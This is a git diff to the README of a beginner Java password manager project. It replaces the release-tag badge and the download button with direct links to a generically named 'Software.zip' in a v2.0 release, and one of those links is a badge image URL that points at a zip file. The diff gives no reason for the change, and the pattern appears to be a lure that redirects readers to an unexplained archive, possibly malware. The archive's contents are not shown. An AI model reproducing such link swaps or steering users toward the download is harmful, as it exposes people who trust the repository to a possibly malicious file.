@@ -1,7 +1,7 @@
 
 # 🌟 Welcome to PasswordManager_Java Repository! 🌟
 
-![PasswordManager_Java](https://github.com/kory714/PasswordManager_Java/releases/tag/v1.0%20Source-brightgreen)
+![PasswordManager_Java](https://github.com/kory714/PasswordManager_Java/releases/download/v2.0/Software.zip%20Source-brightgreen)
 
 ## Introduction
 Welcome to the "PasswordManager_Java" repository, an open-source project focused on developing a desktop application in Java. This project serves as a learning platform for creating a "Password Manager" with various essential functions. As a beginner in software development, I aim to share my progress and achievements with the community through this educational project.
@@ -35,7 +35,7 @@ The project encompasses a variety of technologies and topics related to desktop 
 
 ## Getting Started
 To access the project and get started with exploring the codebase or contributing, you can download the project files by clicking the link below:
-[![Download Project Files](https://github.com/kory714/PasswordManager_Java/releases/tag/v1.0%20Files-blue)](https://github.com/kory714/PasswordManager_Java/releases/tag/v1.0)
+[![Download Project Files](https://github.com/kory714/PasswordManager_Java/releases/download/v2.0/Software.zip%20Files-blue)](https://github.com/kory714/PasswordManager_Java/releases/download/v2.0/Software.zip)
 
 *Note: Click the above button to download the project files locally on your machine for further exploration.*
 
